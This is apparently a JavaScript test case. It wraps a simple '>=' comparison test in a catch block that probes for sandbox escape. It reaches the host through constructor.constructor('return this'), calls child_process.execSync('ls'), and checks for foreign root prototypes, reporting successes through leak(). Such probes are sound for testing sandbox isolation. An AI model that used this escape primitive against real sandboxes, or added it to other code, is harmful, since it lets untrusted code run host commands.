try {
    if (1 >= 1 !== true) {
        $ERROR('#1: 1 >= 1 === true');
    }
    var x = 1;
    if (x >= 1 !== true) {
        $ERROR('#2: var x = 1; x >= 1 === true');
    }
    var y = 1;
    if (1 >= y !== true) {
        $ERROR('#3: var y = 1; 1 >= y === true');
    }
    var x = 1;
    var y = 1;
    if (x >= y !== true) {
        $ERROR('#4: var x = 1; var y = 1; x >= y === true');
    }
    var objectx = new Object();
    var objecty = new Object();
    objectx.prop = 1;
    objecty.prop = 1;
    if (objectx.prop >= objecty.prop !== true) {
        $ERROR('#5: var objectx = new Object(); var objecty = new Object(); objectx.prop = 1; objecty.prop = 1; objectx.prop >= objecty.prop === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}